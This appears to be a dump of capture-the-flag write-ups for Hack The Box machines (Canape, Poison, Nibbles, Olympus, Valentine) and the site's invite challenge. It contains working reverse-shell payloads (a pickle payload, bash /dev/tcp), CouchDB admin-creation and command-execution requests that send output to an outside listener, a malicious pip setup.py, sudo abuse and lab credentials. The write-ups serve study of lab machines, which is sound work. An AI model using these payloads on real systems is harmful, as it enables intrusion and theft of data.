os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\" id_code = submit_exploit(cmd) check_and_run_exploit(id_code) Two disclaimers: The first and last part of the payload have two strings Homer and Marge. The first one is to bypass the whitelist filtering that app has regarding the name of the character. The last one is to avoid the application to trigger and error when concatenating the result of the Pickle.load() to a string (otherwise it will try to concatenate a number (the error code of the executed command) and a string, and it will fail). The REMOTE variable is just something custom made to quickly switch between the Remote server and my local one. After launching the exploit, we get a reverse shell in the port 4444. Once we got the reverse shell, we upgraded to tty (see ippsec video) in order to have more features (history, auto-completition, etc). Although, we have a reverse shell, the user running the HTTP server is www-data , so we need to escalate privileges and log in as other user. Once inside the machine, my first move was to run LinEnum.sh . Once of the outputs of it was the following: I spent hours, trying to understand this file. Until I gave up (hopefully I did it) and continue looking in another place. I guess it was a BIG troll. Analyzing the applications running on the system and its ports, I found the couchdb running in localhost. I started reading a little bit about this DB (never saw it before), and quickly figure it out how to connect to it: $> curl -X GET http://localhost:5984 {\"couchdb\":\"Welcome\",\"version\":\"2.0.0\",\"vendor\":{\"name\":\"The Apache Software Foundation\"}} I started playing around a little more and figured it out how to list dbs and docs inside them: $> curl -X GET http://localhost:5984/_all_dbs [\"_global_changes\",\"_metadata\",\"_replicator\",\"_users\",\"passwords\",\"simpsons\"] $> curl -X GET http://localhost:5984/simpsons/_all_docs {\"total_rows\":7,\"offset\":0,\"rows\":[ {\"id\":\"f0042ac3dc4951b51f056467a1000dd9\",\"key\":\"f0042ac3dc4951b51f056467a1000dd9\",\"value\":{\"rev\":\"1-fbdd816a5b0db0f30cf1fc38e1a37329\"}}, {\"id\":\"f53679a526a868d44172c83a61000d86\",\"key\":\"f53679a526a868d44172c83a61000d86\",\"value\":{\"rev\":\"1-7b8ec9e1c3e29b2a826e3d14ea122f6e\"}}, {\"id\":\"f53679a526a868d44172c83a6100183d\",\"key\":\"f53679a526a868d44172c83a6100183d\",\"value\":{\"rev\":\"1-e522ebc6aca87013a89dd4b37b762bd3\"}}, {\"id\":\"f53679a526a868d44172c83a61002980\",\"key\":\"f53679a526a868d44172c83a61002980\",\"value\":{\"rev\":\"1-3bec18e3b8b2c41797ea9d61a01c7cdc\"}}, {\"id\":\"f53679a526a868d44172c83a61003068\",\"key\":\"f53679a526a868d44172c83a61003068\",\"value\":{\"rev\":\"1-3d2f7da6bd52442e4598f25cc2e84540\"}}, {\"id\":\"f53679a526a868d44172c83a61003a2a\",\"key\":\"f53679a526a868d44172c83a61003a2a\",\"value\":{\"rev\":\"1-4446bfc0826ed3d81c9115e450844fb4\"}}, {\"id\":\"f53679a526a868d44172c83a6100451b\",\"key\":\"f53679a526a868d44172c83a6100451b\",\"value\":{\"rev\":\"1-3f6141f3aba11da1d65ff0c13fe6fd39\"}} $> curl -X GET http://localhost:5984/passwords/_all_docs {\"error\":\"unauthorized\",\"reason\":\"You are not a server admin.\"} So the job now seems to be getting server admin. After a google search looking for vulnerabilties affecting this DB in this version, I found this EXCELENT blogpost . Basically the attack consist in creating a server admin without any credentials only by sending an HTTP request (for further details, read the blog). I changed (just the names) a little bit the PoC of the blog and executed against the db: $> curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{ \"type\": \"user\", \"name\": \"tsuller\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"tsuller\" }' {\"ok\":true,\"id\":\"org.couchdb.user:tsuller\",\"rev\":\"1-0b547bb36cb610ec21d9571312f6e20c\"} Yes! Seems that it worked! Lets check: $> curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs {\"total_rows\":4,\"offset\":0,\"rows\":[ {\"id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"key\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"value\":{\"rev\":\"2-81cf17b971d9229c54be92eeee723296\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"key\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"value\":{\"rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"key\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"value\":{\"rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"key\":\"739c5ebdf3f7a001bebb8fc438004738\",\"value\":{\"rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\"}} ]} YES! Worked. Lets dump the content of each doc: $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4 {\"_id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"_rev\":\"2-81cf17b971d9229c54be92eeee723296\",\"item\":\"ssh\",\"password\":\"0B4jyA0xtytZi7esBNGp\",\"user\":\"\"} $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d {\"_id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"_rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\",\"item\":\"couchdb\",\"password\":\"r3lax0Nth3C0UCH\",\"user\":\"couchy\"} $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f {\"_id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"_rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\",\"item\":\"simpsonsfanclub.com\",\"password\":\"h02ddjdj2k2k2\",\"user\":\"homer\"} $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738 {\"_id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"_rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\",\"user\":\"homerj0121\",\"item\":\"github\",\"password\":\"STOP STORING YOUR PASSWORDS HERE -Admin\"} If we pay atenttion to the home directory, we'll just find homer user. So my next step was to try to login with this user using some of this credentials. Fortunately, the first one (the ssh one) worked, and seconds later I was able to get the user flag:","title":"User"},{"location":"ctfs/hackthebox/hackthebox/#root_5","text":"To start, I ran again the LinEnum.sh but this time tried to pay a little more of attention to the output, but... it was worthless. Nothing point me to the right direction. In some moment, I thought that the couchdb was running as root . I decided to look for some public exploit. Fortunately, I found one that allowed you to execute commands if you were a system admin. Not only we had the user created by us, but also couchy (look the docs of the password db) was admin. Thanks to this blogpost first, and a little help from this also I was able to successfully execute commands: curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d '\"whoami | curl http://10.10.14.255:5555 -d @-\"' --insecure curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing' --insecure curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/blah' -d '{\"_id\":\"770855a97726d5666d70a22173005c77\"}' --insecure curl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?limit=11' -d '{\"language\":\"cmd\",\"map\":\"\"}' -H 'Content-Type: application/json' --insecure Unfortunately, when I went to my shell where I was hosting the NC in port 5555, the news were bad. The answer of the whoami wasn't root but homer. I must have confused with some other running process. I continued looking for some interesting thing, but nothing showed up. During that search, I issued: sudo -l And this was the output: ![sudoers][./images/canape/sudoers.png] For those not very familiar, this means that the user homer can run as root the command pip install without providing a password (this comes from the configuration of the /etc/sudoers file). How can we abuse this? PIP is a python packet manager. It allows not only to write down the package you want (and if it's in the pipy repository download it) but also it allows you to install packages providing the source file directly. Usually, python packages have a very particular file called setup.py which is the one in charge of really installing the package in your enviroment (virtual env or general env). So my idea was to, download a compressed version of package that already exists (I pick request because is my favourite lib), modify it's code, compress it again and try to install it using sudo: Downloaded the source code from here . Decompressed it. Added the following line to the setup.py: os.system('cat /root/root.txt > /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p') (I used that name just to try not to spoil to anybody the flag due to in /tmp there are all the submitted quotes) * Compressed it again. * Served it in a python serve so you can copy it to the machine . * Executed: sudo /usr/bin/pip install blablabla.tar.gz Read the flag from /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p Modify again the previous setup.py again, this time to delete the flag file and don't spoil to anyone =D.","title":"Root"},{"location":"ctfs/hackthebox/hackthebox/#olympus","text":"","title":"Olympus"},{"location":"ctfs/hackthebox/hackthebox/#user_6","text":"Found a weird X-debug header. Keep googling for it and found that there is a metasploit module for it. Get reverse shell as www-data. Metasploit module: nix/http/xdebug_unauth_exec cat the etc/passwd/ see the user zeus. Went to its home directory and find airgeddon directory Use the command download to get it. Find a capture directory wiht a pcap The pcap was about a connection to some wifi endpoint, deauth packets,probe requests. .etc. So clearly maybe we can bruteforce the password of the wifi. https://www.sunnyhoi.com/how-to-crack-wpawpa2-wi-fi-passwords-using-aircrack-ng-in-kali/ Used this command: aircrack-ng -a 2 -b f4:ec:38:ab:a8:a9 -w ~/Tools/john-1.8.0-jumbo-1/run/wordlists/rockyou.txt captured.cap Password found.. Now? See traffic nothng yet.. GO back to the reverse shell.. upload a php one in order to later on updateit to tty I tried to continue with this thing by installing the dropbox client in my machine. I though thay maybe allowing syncing I'll receive be able to read some directory or something like that... But no luck .","title":"User"},{"location":"ctfs/hackthebox/poison/","text":"Poison User So, started with the usual nmap command: We have a lot of things to attack. Let's start with the http. First page ask you to choose one script.. Let's took listfiles.php ... The answer back is an Array object with each file that is inside that folder.. If we pay attention there is one called pwdbackup.txt . I'd like to read it.. so.. what happens if we change the file param of the url? Great... Now.. encoded at least 13 times, pretty easy to noticed that the encode is base64, so let's decoded. I developed a very simple script: import base64 password = \"Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=\" for _ in xrange(13): password = base64.decodestring(password) print password Once executed.. the answer is: Charix!2#4%6&8(0 . Ok maybe this could be a password for something.. maybe ssh, maybe vnc? Anyways, we are missing the user. How could we get the user?. What if we use again the path traversal vuln?: Perfect. There is a user called charix , due to the password has also that string, I guess is the correct user for our password. Let's try an ssh connection: Root Ok, once I started using LinEnum.sh , looking for filesystem files, doing enumeration basically. The first thing, is the secret.zip file which is placed in the home of charix. I copied to my local machine and tried to bruteforce it with JTR, but no luck at all. Then I tried to use the same password as the user of charix and worked!. Anyways, the file is very strange, is just ascii text maybe encoded or encrypted or corrupted. At this moment I thought it was just a troll. Then, I continued enumerating and discovered some processes running as root listeining only in localhost: In particular, Xvnc and sendmail sound weird for me to be running as root. Due to I didn't have any idea of what sendmail was, I started looking for vnc. So I looked for some commands in the machine (just pressing vnc ) and found vncpasswd . Once I ran it, a message telling me which password file was using appeared. So I went to look for that file, and get the following: So, after \"catting\" I realise that was more or less the same format as the file that I already decompressed from the ZIP. So then I went to the internet to try to see if this format was already broken or if there was some tool to let you read the password in plain text from this file. And... yes! there was one . After using it, get the password VNCP@$$! . This probably is the password of root (or toor, there are two users with id 0). I tried them first with ssh, but it didn't work. Clearly, was the VNC password, but I had to test it anyways. At this moment I totally forgot that my nmap had discovered a VNC open port, so I spend more than an hour trying to figure it out how how to initiate a connection from the machine itself to this server that was only listening in the localhost. Finally, I did something different. I used ssh, to make a port forwarding from my local machine to a port of the local port 5901 of the remote machine, by ussing the following command: ssh -L 5901:127.0.0.1:5901 -N -f -l Charix 10.10.10.84 Once I made that connection, using remmina, the root user and the password found, I was able to get the flag: YEAH! I had to copy it char by char xD. Nibbles (User & Rooted) User Reading comments. Found <!-- /nibbleblog/ directory. Nothing interesting here! --> Ran dirbuster against http://10.10.10.75/nibbleblog/ Found admin.php . Tried with some default credentials: admin:admin nibbles:nibbles admin:nibbles (GOT IT!) Tried to look for a LFI in some upload of images (new page, new post) without luck.. Search in google for nibbleblog: It is a well-known CMS! .. Looking for exploit: YEAH! INside MSF . Run the exploit: Once with the meterpreter. cat /etc/passsd Showed me, that there was only one user interesting called nibbler . whoami returned also nibbler . Went to /home/nibbler and...: Root So, first step was to create a reverse shell.. In order to do that I did: On my local machine sudo ufw allow 3333 nc -lnvp 3333 On the remote machine bash -i bash -i >& /dev/tcp/IP/3333 0>&1 Once I have the reverse shell in my local pc, I \"upgraded\" to a full tty (I learned this trick by looking this video ). So next step was use the LinEnum.sh . I found it already in the vm, but othrwise uploading in it to the vm wouldn't be a problem at all (wget to some http server or some other way). Once I ran it, one of the outputs was: User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh [+] Possible sudo pwnage! -rwxrwxrwx 1 nibbler nibbler 21 May 1 19:01 /home/nibbler/personal/stuff/monitor.sh This basicall means that there is a misconfiguration in the /etc/sudoers file which allows the user nibbler to execute any monitor.sh as root, without prompting any password. So my next step was simply: echo \"cat /root/root.txt\" > /home/nibbler/personal/stuff/monitor.sh sudo /home/nibbler/personal/stuff/monitor.sh It's extremely important to run the the sudo comand not with the relative path, but with the absolute one. Because that's how sudo works The output was the flag =):","title":"Poison"},{"location":"ctfs/hackthebox/poison/#poison","text":"","title":"Poison"},{"location":"ctfs/hackthebox/poison/#user","text":"So, started with the usual nmap command: We have a lot of things to attack. Let's start with the http. First page ask you to choose one script.. Let's took listfiles.php ... The answer back is an Array object with each file that is inside that folder.. If we pay attention there is one called pwdbackup.txt . I'd like to read it.. so.. what happens if we change the file param of the url? Great... Now.. encoded at least 13 times, pretty easy to noticed that the encode is base64, so let's decoded. I developed a very simple script: import base64 password = \"Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=\" for _ in xrange(13): password = base64.decodestring(password) print password Once executed.. the answer is: Charix!2#4%6&8(0 . Ok maybe this could be a password for something.. maybe ssh, maybe vnc? Anyways, we are missing the user. How could we get the user?. What if we use again the path traversal vuln?: Perfect. There is a user called charix , due to the password has also that string, I guess is the correct user for our password. Let's try an ssh connection:","title":"User"},{"location":"ctfs/hackthebox/poison/#root","text":"Ok, once I started using LinEnum.sh , looking for filesystem files, doing enumeration basically. The first thing, is the secret.zip file which is placed in the home of charix. I copied to my local machine and tried to bruteforce it with JTR, but no luck at all. Then I tried to use the same password as the user of charix and worked!. Anyways, the file is very strange, is just ascii text maybe encoded or encrypted or corrupted. At this moment I thought it was just a troll. Then, I continued enumerating and discovered some processes running as root listeining only in localhost: In particular, Xvnc and sendmail sound weird for me to be running as root. Due to I didn't have any idea of what sendmail was, I started looking for vnc. So I looked for some commands in the machine (just pressing vnc ) and found vncpasswd . Once I ran it, a message telling me which password file was using appeared. So I went to look for that file, and get the following: So, after \"catting\" I realise that was more or less the same format as the file that I already decompressed from the ZIP. So then I went to the internet to try to see if this format was already broken or if there was some tool to let you read the password in plain text from this file. And... yes! there was one . After using it, get the password VNCP@$$! . This probably is the password of root (or toor, there are two users with id 0). I tried them first with ssh, but it didn't work. Clearly, was the VNC password, but I had to test it anyways. At this moment I totally forgot that my nmap had discovered a VNC open port, so I spend more than an hour trying to figure it out how how to initiate a connection from the machine itself to this server that was only listening in the localhost. Finally, I did something different. I used ssh, to make a port forwarding from my local machine to a port of the local port 5901 of the remote machine, by ussing the following command: ssh -L 5901:127.0.0.1:5901 -N -f -l Charix 10.10.10.84 Once I made that connection, using remmina, the root user and the password found, I was able to get the flag: YEAH! I had to copy it char by char xD.","title":"Root"},{"location":"ctfs/hackthebox/poison/#nibbles-user-rooted","text":"","title":"Nibbles (User &amp; Rooted)"},{"location":"ctfs/hackthebox/poison/#user_1","text":"Reading comments. Found <!-- /nibbleblog/ directory. Nothing interesting here! --> Ran dirbuster against http://10.10.10.75/nibbleblog/ Found admin.php . Tried with some default credentials: admin:admin nibbles:nibbles admin:nibbles (GOT IT!) Tried to look for a LFI in some upload of images (new page, new post) without luck.. Search in google for nibbleblog: It is a well-known CMS! .. Looking for exploit: YEAH! INside MSF . Run the exploit: Once with the meterpreter. cat /etc/passsd Showed me, that there was only one user interesting called nibbler . whoami returned also nibbler . Went to /home/nibbler and...:","title":"User"},{"location":"ctfs/hackthebox/poison/#root_1","text":"So, first step was to create a reverse shell.. In order to do that I did: On my local machine sudo ufw allow 3333 nc -lnvp 3333 On the remote machine bash -i bash -i >& /dev/tcp/IP/3333 0>&1 Once I have the reverse shell in my local pc, I \"upgraded\" to a full tty (I learned this trick by looking this video ). So next step was use the LinEnum.sh . I found it already in the vm, but othrwise uploading in it to the vm wouldn't be a problem at all (wget to some http server or some other way). Once I ran it, one of the outputs was: User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh [+] Possible sudo pwnage! -rwxrwxrwx 1 nibbler nibbler 21 May 1 19:01 /home/nibbler/personal/stuff/monitor.sh This basicall means that there is a misconfiguration in the /etc/sudoers file which allows the user nibbler to execute any monitor.sh as root, without prompting any password. So my next step was simply: echo \"cat /root/root.txt\" > /home/nibbler/personal/stuff/monitor.sh sudo /home/nibbler/personal/stuff/monitor.sh It's extremely important to run the the sudo comand not with the relative path, but with the absolute one. Because that's how sudo works The output was the flag =):","title":"Root"},{"location":"ctfs/hackthebox/registration/","text":"Registration In order to join to the platform, you should solve the first challenge. Once in the JOIN section, open we are asked to prompt a code. We don't have any code yet, so the first step is to look into the page source to find something. After a digging some time, you will find a link to a JS script: /js/inviteapi.min.js . After openning and formating it: eval( function (p,a,c,k,e,d){ e = function(c){return c.toString(36)}; if ( !''.replace(/^/,String)){ while(c--){ d[c.toString(a)] = k[c] || c.toString(a) } k = [function(e){return d[e]}]; e = function(){return'\\\\w+'}; c = 1 }; while(c--){ if (k[c]){ p = p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]) } } return p } ('1 i(4){h 8={\"4\":4};$.9({a:\"7\",5:\"6\",g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:\"7\",5:\"6\",b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {} ) ) So basically, it's a JS functiont that it's being called with some specific parameters. It's not necessary to fully understand the whole thing, we can just use the Chrome/Firefox JS console and make use of this code. Nevertheless, if you copy & paste it, it won't work due to a name for the function is missing. What I did was just to choose some name, copy only the part of the function definition an afterwards call it with the specific parameters: The answer gathered is again JS code: function verifyInviteCode(code){ var formData = {\"code\":code}; $.ajax({ type:\"POST\", dataType:\"json\", data:formData,url:'/api/invite/verify', success:function(response){ console.log(response) }, error:function(response){ console.log(response) } }) } function makeInviteCode(){ $.ajax({ type:\"POST\", dataType:\"json\", url:'/api/invite/how/to/generate', success:function(response){ console.log(response) }, error:function(response){ console.log(response) } }) } This time seems to show us how the InviteCode related functions are invoked... Time to use burp : Issuing the following POST we will receive an answer with some information encoded: POST /api/invite/how/to/generate HTTP/1.1 Host: www.hackthebox.eu Connection: close Accept: */* {\"success\":1,\"data\":{\"data\":\"SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl\",\"enctype\":\"BASE64\"},\"0\":200} After decoding the value inside data which is encoded with the encoding mentioned in enctype , you'll get the a message saying: In order to generate the invite code, make a POST request to /api/invite/generate So, let folow their order: POST /api/invite/generate HTTP/1.1 Host: www.hackthebox.eu Connection: close Accept: */* {\"success\":1,\"data\":{\"code\":\"WElLQVktWFlFWk8tTkpaTEotVVNFQVMtWkJBTE4=\",\"format\":\"encoded\"},\"0\":200} And here it is.. Our code is encoded in base64. Once decoded you'll get your code: XIKAY-XYEZO-NJZLJ-USEAS-ZBALN (in my case). Disclaimer I did the challenge again for the write up because I forgot to do it the first time. This time, the code worked perfectly once I typed it. But the first time I did the challenge I remember that I wasn't able to use the code retrieved, and some error saying something about \"This IP can't use the code\" was triggered. I solved it just connecting through a VPN.","title":"Initial registration to HTB"},{"location":"ctfs/hackthebox/registration/#registration","text":"In order to join to the platform, you should solve the first challenge. Once in the JOIN section, open we are asked to prompt a code. We don't have any code yet, so the first step is to look into the page source to find something. After a digging some time, you will find a link to a JS script: /js/inviteapi.min.js . After openning and formating it: eval( function (p,a,c,k,e,d){ e = function(c){return c.toString(36)}; if ( !''.replace(/^/,String)){ while(c--){ d[c.toString(a)] = k[c] || c.toString(a) } k = [function(e){return d[e]}]; e = function(){return'\\\\w+'}; c = 1 }; while(c--){ if (k[c]){ p = p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]) } } return p } ('1 i(4){h 8={\"4\":4};$.9({a:\"7\",5:\"6\",g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:\"7\",5:\"6\",b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {} ) ) So basically, it's a JS functiont that it's being called with some specific parameters. It's not necessary to fully understand the whole thing, we can just use the Chrome/Firefox JS console and make use of this code. Nevertheless, if you copy & paste it, it won't work due to a name for the function is missing. What I did was just to choose some name, copy only the part of the function definition an afterwards call it with the specific parameters: The answer gathered is again JS code: function verifyInviteCode(code){ var formData = {\"code\":code}; $.ajax({ type:\"POST\", dataType:\"json\", data:formData,url:'/api/invite/verify', success:function(response){ console.log(response) }, error:function(response){ console.log(response) } }) } function makeInviteCode(){ $.ajax({ type:\"POST\", dataType:\"json\", url:'/api/invite/how/to/generate', success:function(response){ console.log(response) }, error:function(response){ console.log(response) } }) } This time seems to show us how the InviteCode related functions are invoked... Time to use burp : Issuing the following POST we will receive an answer with some information encoded: POST /api/invite/how/to/generate HTTP/1.1 Host: www.hackthebox.eu Connection: close Accept: */* {\"success\":1,\"data\":{\"data\":\"SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl\",\"enctype\":\"BASE64\"},\"0\":200} After decoding the value inside data which is encoded with the encoding mentioned in enctype , you'll get the a message saying: In order to generate the invite code, make a POST request to /api/invite/generate So, let folow their order: POST /api/invite/generate HTTP/1.1 Host: www.hackthebox.eu Connection: close Accept: */* {\"success\":1,\"data\":{\"code\":\"WElLQVktWFlFWk8tTkpaTEotVVNFQVMtWkJBTE4=\",\"format\":\"encoded\"},\"0\":200} And here it is.. Our code is encoded in base64. Once decoded you'll get your code: XIKAY-XYEZO-NJZLJ-USEAS-ZBALN (in my case).","title":"Registration"},{"location":"ctfs/hackthebox/registration/#disclaimer","text":"I did the challenge again for the write up because I forgot to do it the first time. This time, the code worked perfectly once I typed it. But the first time I did the challenge I remember that I wasn't able to use the code retrieved, and some error saying something about \"This IP can't use the code\" was triggered. I solved it just connecting through a VPN.","title":"Disclaimer"},{"location":"ctfs/hackthebox/valentine/","text":"Valentine (User & root) User So, in order to start, as always, I used nmap : SSH , HTTP , HTTPS . Let's navigate the web servers while we wait for dirb again. The index of both webservers is an image of a woman like shouting and the logo of heartbleed : From last machine I learn that inside /dev/ something could appear. Let's try...: Well, that was lucky. Inside the notes.txt there isn't anything interesting, but inside hype_key , there is some encoded text. Seems to be printable hex, so let's try to decode it: hex to ascii -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46 DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe 